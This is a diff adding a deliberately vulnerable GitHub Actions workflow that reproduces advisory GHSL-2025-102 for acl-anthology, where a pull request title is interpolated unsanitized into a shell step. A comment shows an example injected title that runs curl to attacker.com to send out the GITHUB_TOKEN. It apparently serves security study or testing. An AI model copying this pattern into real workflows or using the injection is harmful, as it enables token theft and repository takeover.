@@ -1,0 +1,25 @@
+# GHSL-2025-102: Code injection in acl-anthology link-to-checklist.yml
+# Vulnerability: Unsanitized PR title in shell command
+# Affected: .github/workflows/link-to-checklist.yml
+# Reference: https://securitylab.github.com/advisories/GHSL-2025-102_GHSL-2025-103_acl-anthology/
+
+name: Link to Checklist (Vulnerable)
+
+on:
+  pull_request_target:
+    types: [opened]
+
+permissions:
+  pull-requests: write
+
+jobs:
+  link-checklist:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # VULNERABLE: PR title directly interpolated in shell command
+      - name: Process PR
+        run: |
+          echo "PR Title: ${{ github.event.pull_request.title }}"
+          # Attacker can inject: "; curl attacker.com/steal?token=$GITHUB_TOKEN #
